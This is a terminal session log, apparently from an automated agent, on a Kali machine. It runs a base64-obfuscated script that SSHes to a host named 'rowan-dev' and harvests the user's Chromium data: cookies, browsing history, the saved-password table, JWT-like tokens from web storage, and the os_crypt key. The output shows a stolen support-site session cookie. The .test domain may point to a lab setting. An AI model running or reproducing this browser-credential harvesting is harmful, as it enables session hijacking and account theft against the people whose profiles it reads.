@@ -1,0 +1,36 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/p5.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkM9L2hvbWUvcm93YW4vLmNvbmZpZy9jaHJvbWl1bS9EZWZhdWx0CmVjaG8gIiMjIyMjIyMjIGxzIgpscyAtbGEgJEMgMj4vZGV2L251bGwgfCBoZWFkIC01MAplY2hvICIjIyMjIyMjIyBDb29raWVzIHRhYmxlcyIKcHl0aG9uMyAtIDw8J1BZJwppbXBvcnQgc3FsaXRlMyxnbG9iLG9zLGpzb24sYmluYXNjaWkKcD0nL2hvbWUvcm93YW4vLmNvbmZpZy9jaHJvbWl1bS9EZWZhdWx0L0Nvb2tpZXMnCnByaW50KCdleGlzdHMnLG9zLnBhdGguZXhpc3RzKHApLCBvcy5wYXRoLmdldHNpemUocCkgaWYgb3MucGF0aC5leGlzdHMocCkgZWxzZSAnJykKdHJ5OgogICAgY29uPXNxbGl0ZTMuY29ubmVjdCgnZmlsZTonK3ArJz9tb2RlPXJvJyx1cmk9VHJ1ZSkKICAgIGZvciByb3cgaW4gY29uLmV4ZWN1dGUoInNlbGVjdCBob3N0X2tleSxuYW1lLHZhbHVlLGhleChlbmNyeXB0ZWRfdmFsdWUpLGV4cGlyZXNfdXRjLGlzX3NlY3VyZSxpc19odHRwb25seSBmcm9tIGNvb2tpZXMiKToKICAgICAgICBwcmludChyb3cpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZTogcHJpbnQoJ0VSUicsZSkKUFkKZWNobyAiIyMjIyMjIyMgSGlzdG9yeSBrZXBsZXJvcHMgdXJscyIKcHl0aG9uMyAtIDw8J1BZJwppbXBvcnQgc3FsaXRlMyxvcwpwPScvaG9tZS9yb3dhbi8uY29uZmlnL2Nocm9taXVtL0RlZmF1bHQvSGlzdG9yeScKcHJpbnQoJ2V4aXN0cycsb3MucGF0aC5leGlzdHMocCkpCnRyeToKICAgIGNvbj1zcWxpdGUzLmNvbm5lY3QoJ2ZpbGU6JytwKyc/bW9kZT1ybycsdXJpPVRydWUpCiAgICBmb3Igcm93IGluIGNvbi5leGVjdXRlKCJzZWxlY3QgdXJsLHRpdGxlLHZpc2l0X2NvdW50IGZyb20gdXJscyBvcmRlciBieSBsYXN0X3Zpc2l0X3RpbWUgZGVzYyBsaW1pdCA4MCIpOgogICAgICAgIHByaW50KHJvdykKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiBwcmludCgnRVJSJyxlKQpQWQplY2hvICIjIyMjIyMjIyBMb2dpbiBEYXRhIgpweXRob24zIC0gPDwnUFknCmltcG9ydCBzcWxpdGUzLG9zCnA9Jy9ob21lL3Jvd2FuLy5jb25maWcvY2hyb21pdW0vRGVmYXVsdC9Mb2dpbiBEYXRhJwpwcmludCgnZXhpc3RzJyxvcy5wYXRoLmV4aXN0cyhwKSkKdHJ5OgogICAgY29uPXNxbGl0ZTMuY29ubmVjdCgnZmlsZTonK3ArJz9tb2RlPXJvJyx1cmk9VHJ1ZSkKICAgIGZvciByb3cgaW4gY29uLmV4ZWN1dGUoInNlbGVjdCBvcmlnaW5fdXJsLHVzZXJuYW1lX3ZhbHVlLGxlbmd0aChwYXNzd29yZF92YWx1ZSksaGV4KHBhc3N3b3JkX3ZhbHVlKSBmcm9tIGxvZ2lucyIpOgogICAgICAgIHByaW50KHJvdykKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiBwcmludCgnRVJSJyxlKQpQWQplY2hvICIjIyMjIyMjIyBsZXZlbGRiIHN0cmluZ3MgZm9yIHRva2VucyIKZm9yIGQgaW4gIiRDL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIgIiRDL1Nlc3Npb24gU3RvcmFnZSIgIiRDL0luZGV4ZWREQiIgIiRDL1dlYlN0b3JhZ2UiOyBkbwogIGVjaG8gIi0tLSAkZCIKICBbIC1kICIkZCIgXSAmJiBncmVwIC1yYW9FICdleUpbQS1aYS16MC05Xy1dezEwLH1cLltBLVphLXowLTlfLV17MTAsfVwuW0EtWmEtejAtOV8tXXsxMCx9JyAiJGQiIDI+L2Rldi9udWxsIHwgc29ydCAtdSB8IGhlYWQgLTEwCiAgWyAtZCAiJGQiIF0gJiYgZ3JlcCAtcmFpb0UgJyhzZXNzaW9ufHRva2VufHN1cHBvcnR8YXNzaXN0YW50KVteIlxcIF17MCw2MH0nICIkZCIgMj4vZGV2L251bGwgfCBzb3J0IC11IHwgaGVhZCAtMzAKZG9uZQplY2hvICIjIyMjIyMjIyBMb2NhbCBTdGF0ZSBvc19jcnlwdCIKcHl0aG9uMyAtIDw8J1BZJwppbXBvcnQganNvbixvcwpwPScvaG9tZS9yb3dhbi8uY29uZmlnL2Nocm9taXVtL0xvY2FsIFN0YXRlJwpwcmludChvcy5wYXRoLmV4aXN0cyhwKSkKaWYgb3MucGF0aC5leGlzdHMocCk6CiAgICBkPWpzb24ubG9hZChvcGVuKHApKQogICAgcHJpbnQoanNvbi5kdW1wcyhkLmdldCgnb3NfY3J5cHQnLHt9KSlbOjUwMF0pClBZCmVjaG8gIiMjIyMjIyMjIGdyZXAgd2hvbGUgcHJvZmlsZSBmb3Iga2VwbGVyb3BzL3Nlc3Npb24gcXVpY2tseSIKZ3JlcCAtcmFpb0UgJ2h0dHBzPzovL1thLXouXSprZXBsZXJvcHNbYS16Li86LV0qJyAkQyAyPi9kZXYvbnVsbCB8IHNvcnQgLXUgfCBoZWFkIC00MApJTk5FUgplY2hvIERPTkVfTUFSS18kUkFORE9NCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/p5.sh; bash /tmp/p5.sh; echo DONEMARK_1795201655585$((6*7))
+######## ls
+total 52
+drwx------ 2 rowan rowan  4096 Nov 19 07:11 .
+drwx------ 3 rowan rowan  4096 Nov 19 07:11 ..
+-rw------- 1 rowan rowan 20480 Nov 19 07:11 Cookies
+-rw------- 1 rowan rowan 20480 Sep 18 11:00 History
+-rw------- 1 rowan rowan   202 Sep 18 11:00 Preferences
+######## Cookies tables
+exists True 20480
+('support.keplerops.test', 'fieldkest_support', 'fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b', '', 13389457320000000, 1, 1)
+######## History keplerops urls
+exists True
+('https://support.keplerops.test/scp/tickets.php', 'SUP-2841 · ARWC connector callback latency · FieldKest Support', 3)
+######## Login Data
+exists False
+ERR unable to open database file
+######## leveldb strings for tokens
+--- /home/rowan/.config/chromium/Default/Local Storage/leveldb
+--- /home/rowan/.config/chromium/Default/Session Storage
+--- /home/rowan/.config/chromium/Default/IndexedDB
+--- /home/rowan/.config/chromium/Default/WebStorage
+######## Local State os_crypt
+False
+######## grep whole profile for keplerops/session quickly
+/home/rowan/.config/chromium/Default/Cookies:https://keplerops.testfieldkest
+/home/rowan/.config/chromium/Default/History:https://support.keplerops.test/scp/tickets.phpSUP-
+DONE_MARK_19386
